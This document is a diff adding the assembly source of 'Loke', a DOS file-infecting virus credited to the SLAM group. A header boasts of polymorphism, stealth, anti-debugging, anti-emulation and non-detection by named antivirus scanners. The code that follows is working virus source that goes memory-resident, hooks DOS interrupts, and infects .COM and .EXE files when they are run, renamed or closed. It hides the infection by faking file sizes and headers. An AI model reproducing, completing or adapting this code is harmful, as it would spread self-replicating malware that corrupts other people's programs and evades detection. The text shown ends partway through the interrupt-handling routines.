@@ -1,0 +1,1486 @@
+Comment *
+=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-
+Author        : Yesna
+Group         : SLAM
+Virus Name    : Loke
+Version       : 1.00
+Origin        : Denmark
+-----------------------
+Overview      : Loke is a TSR/.COM/.EXE/SFT Stealth/Dir Stealth/Tunnel/Poly
+                virus.
+
+Target        : Loke will infect .EXE/.COM when Int 21h/4Bh, Int 21h/56h and
+                Int 21h/3Eh is being called.
+                Loke will not infect files smaller then 5000 byte and it avoids
+                Overlay and NewEXE files.
+
+Ressy method  : Loke is able to use UMB memory. It will first search for UMB
+                memory and allocate if found. If not it will use conventionel 
+                memory. Loke goes memory resident by manipulating the MCB.
+
+Hook Ints     : Loke will hook Int 21h (DOS Service Calls) and the following
+                functions: 11h/12h/3Dh/3Eh/3Fh/40h/4Bh/4Eh/4Fh/56h/6Ch using
+                tunneling Int 21h by Int 30h/31h tracing. Interrupt 21h is 
+                hooked via DOS bcoz if it was directly hook, its stealth 
+                wouldn't work in DOS box.
+                It will also hook Int 24h (DOS Critical Error Handler)
+
+Polymorphic   : Loke uses it's own internal poly engine [GOE] which will
+                generate JMP's as garbage which then will jump to the actual
+                decryptor.
+
+Encryption    : Loke uses a simple XOR encryption as second layer. In the XOR 
+                routine is an anti-emulation routine. ;)
+
+Stealth       : Loke uses SFT to stealth it's presence.
+                  - On open (3Dh/6Ch) it will stealth true file size
+                  - On read (3Fh) it will redirect current file header to the
+                    original one
+                  - On write (40h) it will disinfect the file.
+                  - On close (3Eh) it will reinfect/infect the file
+
+                Loke also uses directory stealth to stealth the file size and
+                date/time stamp.
+                  - Stealth using DTA (Int 21h/4Eh/4Fh)
+                  - Stealth using FCB (Int 21h/11h/12h)
+
+Anti-AV       : It will also avoid infecting certain AV proggies including
+                command.com. Has an anti-debugging routine.
+
+Anti-Emu      : Loke has an anti-emulation routine.
+
+Note          : Loke works fine in DOS box and so does the SFT and directory 
+                stealth.
+
+                DRWEB V.3.25        : No Detection
+                TBSCAN V.8.05       : No Detection, "J" flag set
+                NOD-ICE V.7.24      : No Detection
+                F-PROT V.2.28b      : No Detection
+                AVP/AVPLITE V.3.0   : No Detection
+                Mcafee SCAN V.3.1.4 : No Detection ;)
+
+Personal stuff:         - My first released virus
+                        - My first polymorphic virus
+                        - My first full stealth virus
+               
+A BIG thanks goes to DARKMAN/29A for the help and for putting up with me =)
+
+=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-=_=î=-
+*
+.Model Tiny
+.Code                                              ;Here we go...
+Org 0h
+
+Eff_Jump:
+  Call Decrypt                                     ;Call decryptor routine...
+  Call Get_Delta
+
+Get_Delta:
+  Pop Bp
+  Sub Bp, (Get_Delta-Eff_Jump)                     ;Delta offset
+
+  Cld                                              ;Clear direction flag
+
+  Push Ds Es                                       ;Keep regs as they were
+
+  Mov Ax, 6700h
+  Int 21h
+  Cmp Ax, 0AAAAh                                   ;Ressy check
+  Je Restore_COM
+
+  Mov Ax, 2503h                                    ;Hook Int 3 (Single Stepper)
+  Int 21h                                          ;A bit of anti-debugging...
+
+  Push Es                                          ;ES points to PSP
+
+  Call Trace_Int21                                 ;Tunneling routine...
+
+  Pop Cx                                           ;CX = ES = PSP
+
+  Xor Di, Di                                       ;DI = 0 
+
+  Mov Ah, 52h                                      ;Get pointer to INVARS
+  Int 21h
+
+  Lds Si, Dword Ptr Es:[Bx+12h]                    ;Points to DOS cache header
+
+  Mov Ax, Word Ptr Ds:[Si+1Fh]                     ;Get addy og first UMB MCB
+  Inc Ax
+  Jz No_UMB                                        ;If 0FFFFh then no UMB
+  Dec Ax
+
+Next_MCB:
+  Mov Ds, Ax                                       ;DS = AX = First UMB MCB
+
+  Cmp Word Ptr Ds:[Di+1], Di                       ;Is it free?
+  Jnz Add_Size
+
+  Cmp Word Ptr Ds:[Di+3], ((Viruz_End-Eff_Jump+0Fh)*2+5050)/10h+1
+  Jae Handle_MCB                                   ;Jump if our virus can fit
+
+Add_Size:
+  Cmp Byte Ptr Ds:[Di], 'Z'                        ;If last in chain, no UMB
+  Jz No_UMB
+
+  Add Ax, Word Ptr Ds:[Di+3]                       ;Add MCB size to AX
+  Inc Ax                                           ;AX = Next MCB
+  Jmp Next_MCB
+
+No_UMB:
+  Dec Cx                                           ;CX = MCB Field
+  Mov Ds, Cx                                       ;DS = CX = MCB
+
+  Xchg Cx, Ax                                      ;AX = CX = MCB
+
+  Cmp Byte Ptr Ds:[Di], 'Z'                        ;Better be last in chain
+  Jne Restore_COM                                  ;If not then exit
+
+Handle_MCB:
+  Mov Byte Ptr Ds:[Di], 'M'                        ;Mark as not last in chain
+  Sub Word Ptr Ds:[Di+3], ((Viruz_End-Eff_Jump+0Fh)*2+5050)/10h+1
+  Sub Word Ptr Ds:[Di+12h], ((Viruz_End-Eff_Jump+0Fh)*2+5050)/10h+1
+
+  Inc Ax                                           ;AX = PSP
+  Add Ax, Word Ptr Ds:[Di+3]                       ;AX points to our new MCB
+  Mov Ds, Ax                                       ;DS = AX = New MCB
+
+  Mov Byte Ptr Ds:[Di], 'Z'                        ;Marks as last in chain
+  Mov Word Ptr Ds:[Di+1], 8                        ;DOS owner
+  Mov Word Ptr Ds:[Di+3], ((Viruz_End-Eff_Jump+0Fh)*2+5050)/10h
+
+  Inc Ax
+  Mov Es, Ax                                       ;ES points to mem hole
+
+  Push Cs
+  Pop Ds                                           ;DS = CS
+
+  Mov Si, Bp                                       ;SI = BP = Start of virus
+  Mov Cx, (Viruz_End-Eff_Jump)                     ;Move virus up in mem
+  Rep MovSb
+
+  Push Es
+  Pop Ds                                           ;DS = ES = Seg. of our MCB
+
+  Mov Ax, 2521h                                    ;Hook Int 21h via DOS
+  Mov Dx, Offset Handle_Int21                      ;DX = to our int 21 handler
+  Int 21h 
+
+;******************************************************************************
+;*                          Jump Back To Host....                             *
+;******************************************************************************
+
+Restore_COM:
+  Cmp Byte Ptr Cs:[Buffer][Bp], 4Dh                ;.EXE file?
+  Je Restore_EXE                                   ;Jump to EXE exit if equal
+
+  Pop Es Ds                                        ;Restore DS and ES
+
+  Mov Di, 100h                                     ;Start of COM proggy
+  Push Di                                          ;Used to jump back to host
+  Lea Si, Ds:[First3][Bp]                          ;Restore header...
+  MovSw
+  MovSb
+
+  Xor Ax, Ax                                       ;Clear Ax before host...
+
+  Ret                                              ;Back to host...
+
+First3 Db 0CDh, 20h, 0
+
+Restore_EXE:
+  Pop Es Ds                                        ;Restore DS and ES
+
+  Mov Ax, Ds                                       ;AX = DS = PSP
+  Add Ax, 10h                                      ;Start of EXE
+
+  Add Word Ptr Cs:[EXE_Cs_Ip+2][Bp], Ax            ;Old CS reg...
+
+  Cli                                              ;Disable interrupts
+
+EXE_Sp Equ Word Ptr $+1                            ;SP Variable
+  Mov Sp, 00h                                      ;Old SP reg
+
+EXE_Ss Equ Word Ptr $+1                            ;SS variable
+  Add Ax, 00h                                      ;Old SS reg...
+  Mov Ss, Ax
+
+  Sti                                              ;Enable interrupts
+
+  Xor Ax, Ax                                       ;Clear Ax before host
+
+  Db 0EAh                                          ;Jump back to host...
+
+EXE_Cs_Ip Dd ?
+
+;******************************************************************************
+;*                        Tunneling Interrupt 21h                             *
+;*                               Using PSP                                    *
+;******************************************************************************
+
+Trace_Int21:
+  Xor Ax, Ax
+  Mov Ds, Ax                                       ;DS = AX = IVT
+  Mov Bx, 0C0h                                     ;BX = Offset of Int 30h
+
+Trace_Next:
+  Cmp Byte Ptr Ds:[Bx], 0EAh                       ;Is diz a jump?
+  Jnz Dispatch                                     ;If not, jump to checker
+
+  Lds Bx, Dword Ptr Ds:[Bx+1]                      ;DS:BX = Seg./Off. of jump
+
+  Cmp Word Ptr Ds:[Bx], 9090h                      ;Start of dispatcher?
+  Jnz Trace_Next                                   ;No, Then search for next
+
+  Sub Bx, 32h                                      ;BX = Offset of int 21h
+
+  Cmp Word Ptr Ds:[Bx], 9090h                      ;Start of interrupt 21h?
+  Jnz Dispatch
+
+  Jmp Found_Int21                                  ;Ok we found the damn int
+
+Dispatch:
+  Cmp Word Ptr Ds:[Bx], 2E1Eh                      ;Start of dispatcher?
+  Jnz Trace_Failed                                 ;No! Well we failed...
+
+  Add Bx, 25h                                      ;BX = Offset of int 21h
+
+  Cmp Word Ptr Ds:[Bx], 80FAh                      ;Start of interrupt 21h?
+  Jz Found_Int21                                   ;Equal? We found it!!
+
+Trace_Failed:
+  Mov Ds, Ax                                       ;DS = AX = IVT
+
+  Mov Si, 21h*4                                    ;SI = Offset of int 21h
+
+  Lds Bx, Dword Ptr Ds:[Si]                        ;Get Int 21h addy
+
+Found_Int21:
+  Mov Word Ptr Cs:[OldInt21][Bp], Bx               ;Save addy in variables
+  Mov Word Ptr Cs:[OldInt21+2][Bp], Ds
+
+  Ret
+
+;******************************************************************************
+;*                           Handle Interrupt 24h                             *
+;*                            Handle DOS errors                               *
+;******************************************************************************
+
+Hook_Int24:
+  Push Ax Ds Es Di                                 ;Save used registers
+
+  Xor Ax, Ax
+  Mov Ds, Ax                                       ;DS = AX = IVT
+
+  Les Di, Dword Ptr Ds:[24h*4]                     ;Get int 24h addy
+
+  Mov Word Ptr Cs:[Old_Int24], Es                  ;Save original Int 24h addy
+  Mov Word Ptr Cs:[OldInt24], Di
+
+  Push Cs
+  Pop Ax                                           ;AX = CS
+
+  Lea Di, Cs:[Handle_Int24]                        ;DI = to our int 24h handler
+
+New_Int24:
+  Mov Word Ptr Ds:[24h*4+2], Ax
+  Mov Word Ptr Ds:[24h*4], Di                      ;Set new Int 24h addy
+
+  Pop Di Es Ds Ax                                  ;Restore used registers
+
+  Ret
+
+Unhook_Int24:
+  Push Ax Ds Es Di                                 ;Save used registers
+
+  Xor Ax, Ax
+  Mov Ds, Ax                                       ;DS = AX = IVT
+
+OldInt24 Equ Word Ptr $+1                          ;Int 24h Segment variable
+  Mov Ax, 00h                                      ;AX = Int 24h segment
+
+Old_Int24 Equ Word Ptr $+1                         ;Int 24h Offset variable
+  Mov Di, 00h                                      ;DI = Int 24h offset
+
+  Jmp New_Int24                                    ;Restore Interrupt 24h addy
+
+Handle_Int24:
+  Mov Al, 3                                        ;Error handler...
+  Iret
+
+;******************************************************************************
+;*                       Handle Interrupt 21h Calls                           *
+;******************************************************************************
+
+Handle_Int21:
+  Cmp Ax, 6700h
+  Jne Its_Ok                                       ;Ressy check...
+  Mov Ax, 0AAAAh
+  Iret
+
+Its_Ok:
+  Call Push_All                                    ;Save flags and regs
+
+  Cld                                              ;Let's clear Direction Flag
+
+  Xor Ah, 10h                                      ;Avoid AV alert
+
+  Cmp Ah, 11h Xor 10h                              ;Findfirst FCB
+  Je DIR_Stealth_FCB
+
+  Cmp Ah, 12h Xor 10h                              ;Findnext FCB
+  Je DIR_Stealth_FCB
+
+  Cmp Ah, 3Dh Xor 10h                              ;Open file
+  Je Stealth_OPEN
+
+  Cmp Ah, 3Eh Xor 10h                              ;Close file
+  Je Reinfect_FILE
+
+  Cmp Ah, 3Fh Xor 10h                              ;Read file
+  Je Stealth_READ
+
+  Cmp Ah, 40h Xor 10h                              ;Write file
+  Je Stealth_Write
+
+  Cmp Ah, 4Bh Xor 10h                              ;Execute file
+  Je Infect_File
+
+  Cmp Ah, 4Eh Xor 10h                              ;Findfirst DTA
+  Je DIR_Stealth_DTA
+
+  Cmp Ah, 4Fh Xor 10h                              ;Findnext DTA
+  Je DIR_Stealth_DTA
+
+  Cmp Ah, 56h Xor 10h                              ;Rename file
+  Je Infect_File
+
+  Cmp Ah, 6Ch Xor 10h                              ;Extended open file
+  Je Stealth_EXT_OPEN
+
+Return:
+  Call Pop_All                                     ;Restore old flags and regs
+
+  Jmp Dword Ptr Cs:[OldInt21]                      ;Original Interrupt 21h
+
+DIR_Stealth_FCB:
+  Jmp Stealth_DIR_FCB
+
+DIR_Stealth_DTA:
+  Jmp Stealth_DIR_DTA
+
+Stealth_EXT_OPEN:
+  Xchg Si, Dx
+
+Stealth_OPEN:
+  Jmp Do_OPEN_Stealth
+
+Stealth_READ:
+  Jmp Do_READ_Stealth
+
+Stealth_WRITE:
+  Jmp Do_WRITE_Stealth
+
+Reinfect_FILE:
+  Jmp Do_Reinfect
+
+Pre_Exit:
+  Jmp Exit
+
+;******************************************************************************
+;*                     Called By Interrupt (4Bh/56h)                          *
+;*Diz routine will determine if it's a valid file or file is already infected.*
+;******************************************************************************
+
+Infect_File:
+  Call Hook_Int24                                  ;Assure no write error(s)
+
+  Mov Ax, 4301h
+  Mov Cx, 20h                                      ;Reset file attributes
+  Call Int21
+
+  Mov Ax, 3D02h                                    ;Open file
+  Call Int21
+
+  Xchg Ax, Bx                                      ;BX = AX = File pointer
+
+  Call Check_File                                  ;Check file...
+  Jc Done_Infection                                ;No AV or COMMAND.COM please
+
+Close_Infect:
+  Mov Ax, Word Ptr Es:[Di+5]                       ;Device handler info...
+  
+  Test Al, 80h                                     ;No device, only file
+  Jnz Done_Infection
+
+  Test Ah, 0Fh                                     ;No remote file...
+  Jnz Done_Infection
+
+  Call Check_It                                    ;Are we infected?
+  Jc Done_Infection                                ;Exit on carry flag
+
+  Push Cs Cs
+  Pop Ds Es                                        ;DS and ES = CS
+
+  Mov Ax, 5700h                                    ;Get time/date stamp
+  Call Int21
+
+  Mov Word Ptr Ds:[Old_Time], Cx                   ;Save time in variable
+  Mov Word Ptr Ds:[Old_Date], Dx                   ;Save date in variable
+
+  Mov Ah, 3Fh
+  Mov Cx, 1Ch                                      ;Read file header
+  Lea Dx, Ds:[Buffer]                              ;Into buffer...
+  Call Int21
+
+  Mov Cx, 1Ch
+  Lea Si, Ds:[Buffer]                              ;Copy Buffer 
+  Lea Di, Ds:[Old_Buffer]                          ;Into Old_Buffer...
+  Rep MovSb
+
+  Lea Si, Ds:[Buffer]
+  Lea Di, Ds:[First3]                              ;First 3 bytes, for .COM
+  MovSw
+  MovSb
+
+  Call Seek_End                                    ;Goto EOF
+
+  Cmp Ax, 5000
+  Jb Done_Infection                                ;Is file above 5000 bytes ?
+
+  Cmp Byte Ptr Ds:[Buffer], 4Dh                    ;.EXE file ?
+  Je Infect_EXE
+
+  Cmp Ax, 63000
+  Ja Done_Infection                                ;File above 63000 bytes ?
+
+  Sub Ax, 3
+  Mov Byte Ptr Ds:[Buffer], 0E9h                   ;Save jump opcode
+  Mov Word Ptr Ds:[Buffer+1], Ax                   ;Save offset to jump to
+
+Offset_COM:
+  Add Ax, 103h
+  Xchg Ax, Bp                                      ;Calculate offset in file
+
+Write_Viruz:
+  Push Cs
+  Pop Es                                           ;ES = CS
+  Call Infect                                      ;Infect the file...hehehe
+
+Done_Infection:
+  Mov Ah, 3Eh                                      ;Close file...
+  Call Int21
+
+Exit:
+  Call Unhook_Int24                                ;No errors, we did our job
+  Jmp Return                                       ;Jump back to Int 21h
+
+;******************************************************************************
+;*          Diz routine will infect .EXE files NOT overlay .EXE               *
+;******************************************************************************
+
+Infect_EXE:
+  Cmp Byte Ptr Ds:[Buffer+18h], 40h                ;No NewEXE files...
+  Je Done_Infection
+
+  Cmp Byte Ptr Ds:[Buffer+1Ah], 0                  ;No overlay files... 
+  Jne Done_Infection
+
+  Les Ax, Dword Ptr Ds:[Buffer+14h]                ;Points to CS/IP in header
+  Mov Word Ptr Ds:[EXE_Cs_Ip+2], Es                ;Save CS in variable
+  Mov Word Ptr Ds:[EXE_Cs_Ip], Ax                  ;Save IP in variable
+
+  Les Ax, Dword Ptr Ds:[Buffer+0Eh]                ;Points to SS/SP in header
+  Mov Word Ptr Ds:[EXE_Ss], Ax                     ;Save SS in variable
+  Mov Word Ptr Ds:[EXE_Sp], Es                     ;Save SP in variable
+
+  Call Seek_End                                    ;Goto EOF
+
+  Push Ax Dx                                       ;Save file size
+
+  Mov Cx, 10h                                      ;Calculate new CS and IP
+  Div Cx
+
+  Mov Bp, Dx                                       ;BP = DX = Offset in file
+
+  Sub Ax, Word Ptr Ds:[Buffer+8]                   ;Substract header size
+
+  Mov Word Ptr Ds:[Buffer+16h], Ax                 ;AX = New CS
+  Mov Word Ptr Ds:[Buffer+14h], Dx                 ;DX = New IP
+
+  Add Ax, ((Viruz_End-Eff_Jump)+5050)/10h+1        ;Calculate new stack segment
+
+  Mov Word Ptr Ds:[Buffer+0Eh], Ax                 ;AX = New SS
+  And Word Ptr Ds:[Buffer+10h], 0FFFEh             ;New SP, No odd stack
+
+  Pop Dx Ax                                        ;Old size of file
+  Add Ax, (Viruz_End-Eff_Jump)+5050                ;Add virus size to file
+  Adc Dx, 0h                                       ;Add 1 to segment if > 64Kb
+
+  Mov Cx, 200h                                     ;Convert into 512 byte pages
+  Div Cx
+
+  Or Dx, Dx
+  Je Dont_Inc_Page                                 ;Even?
+   
+  Inc Ax                                           ;Increment on not even.
+
+Dont_Inc_Page:
+
+  Mov Word Ptr Ds:[Buffer+2], Dx                   ;Save length of last page
+  Mov Word Ptr Ds:[Buffer+4], Ax                   ;Save number of pages
+
+  Jmp Write_Viruz                                  ;Write virus to EOF
+
+;******************************************************************************
+;*          Infect File By Writing New Header And Virus Body To EOF           *
+;******************************************************************************
+
+Infect:
+  Call Random                                      ;AX = Random word
+  Mov Byte Ptr Ds:[Crypt_Value], Al                ;Save crypt value
+
+  Lea Di, Ds:[Viruz_End+5050]                      ;DI = Place to move code
+  Lea Si, Ds:[Eff_Jump]                            ;SI = Moving code from...
+  Mov Cx, (Viruz_End-Eff_Jump)                     ;CX = How many bytes to copy
+  Push Di Di                                       ;Save DI for later use
+  Rep MovSb                                        ;Copy the virus
+
+  Mov Cx, (Decrypt-Eff_Jump-3)                     ;CX = Number to crypt
+
+  Pop Si                                           ;SI = Start of code to crypt
+  Add Si, 3                                        ;Don't crypt the CALL inst.
+
+  Call Second_Layer                                ;Do second encryption
+
+  Lea Di, Ds:[Viruz_End]                           ;DI = Start of crypt area
+  Pop Si                                           ;SI = Start of code to crypt
+  Mov Cx, (Viruz_Code-Eff_Jump)                    ;CX = Number to encrypt
+
+  Push Bx Ax                                       ;Save file handle
+  Call GOE                                         ;Call internal poly engine
+  Pop Ax Bx                                        ;Restore file handle
+
+  Mov Ax, (Viruz_End-Eff_Jump)+5050-1Dh
+  Sub Ax, Cx                                       ;Calculate number of
+  Add Cx, Ax                                       ;bytes to write
+
+  Mov Ah, 40h
+  Lea Dx, Ds:[Viruz_End]                           ;Write virus body...
+  Call Int21
+
+  Call Seek_End                                    ;Goto EOF
+
+  Call Random                                      ;Get a random word
+
+  Mov Byte Ptr Ds:[Old_Buffer+1Ch], Al             ;Save crypt value...
+
+  Call Crypt_Header                                ;Crypt original file header
+
+  Mov Ah, 40h
+  Mov Cx, 1Dh                                      ;Save encrypted original
+  Lea Dx, Ds:[Old_Buffer]                          ;header at EOF
+  Call Int21
+  
+  Call Seek_Start                                  ;Goto SOF
+
+  Mov Ah, 40h
+  Mov Cx, 1Ch                                      ;Write new file header
+  Lea Dx, Ds:[Buffer]
+  Call Int21
+
+  Mov Ax, 5701h                                    ;Set Time/Date Stamp
+
+Old_Time Equ Word Ptr $+1                          ;Original Time variable
+  Mov Cx, 00h                                      ;CX = Original Time
+
+Old_Date Equ Word Ptr $+1                          ;Original Date variable
+  Mov Dx, 00h                                      ;DX = Original Date
+
+  And Cx, 0FFE0h
+  Or Cl, 8 / 2                                     ;Infection mark
+  Call Int21                                       ;Set the infection mark
+
+  Ret
+
+Error:
+  Jmp Done_Infection                               ;Infection finished...
+
+;******************************************************************************
+;*                     Called By Interrupt (3Dh/6Ch)                          *
+;*        Diz routine will stealth the true size of file on opening           *
+;******************************************************************************
+
+Do_OPEN_Stealth:
+  Call Pop_All                                     ;Restore flags and regs
+  Call Int21                                       ;Call original interrupt 21h
+  Jnc OPEN_OK
+
+  Stc
+  Retf 02h                                         ;Return if error...
+
+OPEN_OK:
+  Call Push_All                                    ;Save regs and flags
+
+  Xchg Bx, Ax                                      ;BX = AX = File handler
+  Call Get_SFT                                     ;Get SFT of file
+  Jc No_OPEN                                       ;Exit if error occured
+
+  Call Check_It                                    ;Is it infected?
+  Jnc No_OPEN                                      ;If not then exit
+
+  Sub Word Ptr Es:[Di+11h], (Viruz_End-Eff_Jump)+5050
+  Sbb Word Ptr Es:[Di+13h], 0                      ;Substract virus size
+
+No_OPEN:
+  Call Pop_All                                     ;Restore used regs amd flags
+
+  Clc                                              ;Clear carry flag
+
+  Retf 02h                                         ;Return to host
+
+;******************************************************************************
+;*                         Called By Interrupt (3Fh)                          *
+;*          Diz routine will redirect read data to original data...           *
+;******************************************************************************
+
+Do_READ_Stealth:
+  Call Pop_All
+  Call Push_All
+
+  Call Get_SFT                                     ;Get SFT of file 
+  Jc No_READ                                       ;Error?
+
+  Call Check_It                                    ;Is it infected?
+  Jnc No_READ                                      ;Not? Then exit
+
+  Mov Ax, Word Ptr Es:[Di+5]                       ;Get device info of handle
+
+  Test Al, 80h                                     ;No devices only files
+  Jnz No_READ                                      ;device? Then exit...
+
+  Test Ah, 0Fh                                     ;No remote files neither
+  Jnz No_READ
+
+  Mov Ax, Word Ptr Es:[Di+15h]                     ;Are we reading the header?
+  Cmp Ax, 1Ch
+  Jae No_READ                                      ;No, then no stealth
+
+  Cmp Word Ptr Es:[Di+17h], 0                      ;Exit if we are...
+  Jne No_READ
+
+  Mov Word Ptr Cs:[File_Off], Ax                   ;Save pointer in file...
+  Call Pop_All
+
+  Mov Word Ptr Cs:[Read_Off], Dx                   ;Save offset in file
+  Mov Word Ptr Cs:[Read_Seg], Ds                   ;Save segment in file
+
+  Call Int21                                       ;Call original interrupt 21h
+  Jnc Do_READ
+
+  Call Pop_All                                     ;Restore used regs and flags
+  Stc                                              ;Set carry flag
+  Retf 02h                                         ;Back to host...
+
+No_READ:
+  Jmp Return                                       ;Back to host...
+
+Do_READ:
+  Call Push_All                                    ;Save used regs and flags
+  Call Get_SFT                                     ;Get SFT of file
+  Jc Exit_READ                                     ;Error?
+
+  Push Word Ptr Es:[Di+15h]                        ;Save offset in file
+  Push Word Ptr Es:[Di+17h]                        ;Save segment in file
+
+  Push Word Ptr Es:[Di+11h]                        ;Save low word file size
+  Push Word Ptr Es:[Di+13h]                        ;Save high word file size
+
+  Add Word Ptr Es:[Di+11h], (Viruz_End-Eff_Jump)+5050
+  Adc Word Ptr Es:[Di+13h], 0                      ;Add virus size...
+
+  Call Seek_End                                    ;Goto EOF
+
+  Sub Word Ptr Es:[Di+15h], 1Dh                    ;Substract 1Dh from file
+  Sbb Word Ptr Es:[Di+17h], 0                      ;Pointing to crypted header
+
+  Push Cs
+  Pop Ds                                           ;DS = CS
+
+  Mov Ah, 3Fh                                      ;Read encrypted header
+  Mov Cx, 1Dh                                      ;Read 1Dh bytes
+  Lea Dx, Ds:[Old_Buffer]
+  Call int21
+  Jc Error_READ                                    ;Error?
+
+  Call Crypt_Header                                ;Decrypt header
+
+Read_Off Equ Word Ptr $+1                          ;Offset in file variable
+  Mov Di, 00h                                      ;DI = Original off. in file
+
+Read_Seg Equ Word Ptr $+1                          ;Segment in file variable
+  Mov Ax, 00h                                      ;AX = Original seg. in file
+
+  Push Ax
+  Pop Es                                           ;ES = AX = Segment in file
+
+File_Off Equ Word Ptr $+1                          ;File pointer off. variable
+  Mov Ax, 00h                                      ;AX = Original pointer off.
+
+  Lea Si, Ds:[Old_Buffer]                          ;SI points to old_buffer
+  Mov Cx, 1Ch                                      ;Number to redirect
+  Add Di, Ax                                       ;Add File pointer to off.
+  Add Si, Ax                                       ;Add file pointer to old_buf
+  Sub Cx, Ax                                       ;Subtract CX with file point
+  Rep MovSb                                        ;Do redirect...
+
+Error_READ:
+  Call Get_SFT                                     ;Get SFT of file
+
+  Pop Word Ptr Es:[Di+13h]                         ;Restore high word of size
+  Pop Word Ptr Es:[Di+11h]                         ;Restore low word of size
+
+  Pop Word Ptr Es:[Di+17h]                         ;Restore file segment
+  Pop Word Ptr Es:[Di+15h]                         ;Restore file offset
+
+Exit_READ:
+  Call Pop_All                                     ;Restore used flags and regs
+  Clc                                              ;Clear carry flag
+  Retf 02h                                         ;Back to host...
+
+;******************************************************************************
+;*                  Reinfects/infects file on closing (3Eh)                   *
+;******************************************************************************
+
+Do_Reinfect:
+  Call Check_Exe_Com                               ;Is it command.com/AV?
+  Jc Already_Infected                              ;YES! then leave it alone!
+
+  Call Hook_Int24                                  ;No error today BABY!
+
+  Mov Ah, 45h                                      ;Duplicate file handle
+  Call Int21
+  Jc Already_Infected                              ;Sheeit there was an error!
+
+  Xchg Ax, Bx                                      ;BX = AX = new file handler
+
+  Call Seek_Start                                  ;Goto SOF
+
+  Mov Word Ptr Es:[Di+2], 2                        ;Set read/write open mode
+  Mov Byte Ptr Es:[Di+4], 20h                      ;Set archieve attribute
+
+  Jmp Close_Infect                                 ;Infect the damn file...
+
+Already_Infected:
+  Jmp Return                                       ;Back to host...
+
+;******************************************************************************
+;*                         Called By Interrupt (40h)                          *
+;*               Disinfect if infected file is being writed to                *
+;******************************************************************************
+
+Do_WRITE_Stealth:
+  Call Pop_All                                     ;Restore Flag ans regs
+  Call Push_All                                    ;Then save for on exit
+
+  Call Get_SFT                                     ;Get SFT of file
+  Jc Error_                                        ;No errors
+ 
+  Call Check_It                                    ;Is it infected?
+  Jc Disinfect                                     ;Yes, then disinfect
+
+Error_:
+  Jmp Error_WRITE                                  ;Go away if not...
+
+Disinfect:
+  Mov Ax, 2
+  Xchg Ax, Word Ptr Es:[Di+2]                      ;Force Read/Write open mode
+  Push Ax                                          ;Save open mode on stack
+
+  Mov Al, 20h                                      ;Change to archiev file
+  Xchg Al, Byte Ptr Es:[Di+4]                      ;Change file attributes
+  Push Ax                                          ;Save file attributes
+
+  Push Word Ptr Es:[Di+15h]                        ;Save file pointer offset
+  Push Word Ptr Es:[Di+17h]                        ;Save file pointer segment
+  
+  Add Word Ptr Es:[Di+11h], (Viruz_End-Eff_Jump)+5050
+  Adc Word Ptr Es:[Di+13h], 0                      ;Add virus size
+  
+  Call Seek_End                                    ;Goto EOF
+
+  Sub Word Ptr Es:[Di+15h], 1Dh                    ;New file pointer offset
+  Sbb Word Ptr Es:[Di+17h], 0                      ;New file pointer segment?
+
+  Push Cs
+  Pop Ds                                           ;DS = CS
+  Mov Ah, 3Fh                                      ;Read encrypted file
+  Mov Cx, 1Dh                                      ;header into variable
+  Lea Dx, Ds:[Old_Buffer]
+  Call Int21
+
+  Call Crypt_Header                                ;Decrypt file header
+
+  Call Seek_Start                                  ;Goto SOF
+  Lea Dx, Ds:[Old_Buffer]                          ;DX = Old_Buffer variable
+  Mov Cx, 1Ch                                      ;Write decrypted header
+  Mov Ah, 40h                                      ;to old file header
+  Call Int21
+
+  Call Seek_End                                    ;Goto EOF
+  Sub Word Ptr Es:[Di+15h], (Viruz_End-Eff_Jump)+5050
+  Sbb Word Ptr Es:[Di+17h], 0                      ;Restore old file size
+  Xor Cx, Cx
+  Mov Ah, 40h                                      ;Delete virus body
+  Call Int21
+
+  Pop Word Ptr Es:[Di+17h]                         ;Restore old file pointer
+  Pop Word Ptr Es:[Di+15h]                         ;position
+
+  Pop Ax                                           ;AX = File attribute
+  Mov Byte Ptr Es:[Di+4], Al                       ;Restore old file attribute
+
+  Pop Word Ptr Es:[Di+2]                           ;Restore old open mode
+
+  Mov Ah, 3Eh                                      ;Close file
+  Call Int21
+Error_WRITE:
+  Jmp Return                                       ;Jump back to host...
+
+;******************************************************************************
+;*                      Called By Interrupt (11h/12h)                         *
+;*      Diz will stealth true file size and date/time stamp on FCB call       *
+;******************************************************************************
+
+Stealth_DIR_FCB:
+  Call Pop_All                                     ;Regs and flags restored
+
+  Call Int21                                       ;Original interrupt 21h
+
+  Call Push_All                                    ;Save new regs and flags
+
+  Cmp Al, 255                                      ;If Al = 255 then no FCB
+  Je No_FCB
+
+  Mov Ah, 2Fh                                      ;Get DTA info of file
+  Call Int21
+
+  Cmp Word Ptr Ds:[Bx], 0FFh                       ;Extended block?
+  Jne Not_Extended                                 ;Jump if not
+
+  Add Bx, 7                                        ;Add 7 if it's extended
+
+Not_Extended:
+  Mov Ax, Word Ptr Ds:[Bx+17h]                     ;AX = pointer to date/time
+  And Al, 1Fh
+
+  Cmp Al, 8 / 2
+  Jne No_FCB                                       ;Is it infected?
+
+  Sub Word Ptr Ds:[Bx+1Dh], (Viruz_End-Eff_Jump)+5050
+  Sbb Word Ptr Ds:[Bx+1Fh], 0                      ;Subtract virus size
+
+No_FCB:
+  Call Pop_All                                     ;Restore regs and flags
+
+  Clc                                              ;Clear carry flag
+
+  Iret                                             ;Back to DOS
+
+;******************************************************************************
+;*                       Called By Interrupt (4Eh/4Fh)                        *
+;*         Used to stealth true file size and date/time stamp on DTA          *
+;******************************************************************************
+
+Stealth_DIR_DTA:
+  Call Pop_All                                     ;Restore flags and regs 
+
+  Call Int21                                       ;Original int 21h call
+  Jnc Do_DTA
+
+  Retf 02h                                         ;Error occured..exit
+
+Do_DTA:
+  Call Push_All                                    ;Save new flags and regs
+
+  Mov Ah, 2Fh                                      ;Get current DTA of file
+  Call Int21
+
+  Mov Ax, Word Ptr Ds:[Bx+16h]                     ;AX = Pointer date/time
+  And Al, 1Fh
+
+  Cmp Al, 8 / 2
+  Jne No_DTA                                       ;Are we infected?
+
+  Sub Word Ptr Ds:[Bx+1Ah], (Viruz_End-Eff_Jump)+5050
+  Sbb Word Ptr Ds:[Bx+1Ch], 0                      ;Subtract virus size
+
+No_DTA:
+  Call Pop_All                                     ;Restore flags and regs
+
+  Clc                                              ;Clear carry flag
+
+  Retf 02h                                         ;Back to host
+
